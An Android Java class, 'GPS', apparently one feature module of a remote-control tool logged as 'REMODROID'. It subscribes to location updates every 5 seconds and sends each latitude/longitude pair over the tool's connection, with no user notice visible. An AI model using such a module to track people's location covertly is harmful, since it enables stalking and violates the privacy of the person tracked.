package com.remo.Features;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;
import com.remo.App;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;

import java.io.UnsupportedEncodingException;

import static android.content.Context.LOCATION_SERVICE;

public class GPS extends Feature {

    public GPS(){
        UseMainConnection = false;
        Feature_type = DataHandler.eDataType.GPS.ordinal();
    }

    @Override
    public void AsyncTaskFunc(String Params) {
        try {
            Log.e("REMODROID","GPS 1");
            LocationManager mLocationManager = (LocationManager) App.get().getApplicationContext().getSystemService(LOCATION_SERVICE);

            Log.e("REMODROID","GPS 2");

            //mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, mLocationListener,Looper.getMainLooper());
            if (mLocationManager != null) {
                mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 5, mLocationListener,Looper.getMainLooper());
            }else {
                Log.e("REMODROID","GPS 10");
            }
            Log.e("REMODROID","GPS 3");
        }catch (SecurityException | NullPointerException e){
            Log.e("REMODROID","GPS Error " +e.getMessage());
        }


    }

    @Override
    public void update(String Params) {

    }



    private final LocationListener mLocationListener = new LocationListener() {
        @Override
        public void onLocationChanged(final Location location) {
            //your code here
            Log.e("REMODROID","GPS 4");
            try {
                sendPacket((
                        location.getLatitude() + "/" +location.getLongitude()).getBytes("UTF-8"));
                Log.d("REMODROID",location.getLatitude() + "/" +location.getLongitude());
                Log.e("REMODROID","GPS 5");
            } catch (UnsupportedEncodingException e) {
                Log.e("REMODROID","GPS Send Error");
            }

        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {

        }

        @Override
        public void onProviderEnabled(String provider) {

        }

        @Override
        public void onProviderDisabled(String provider) {

        }
    };
}
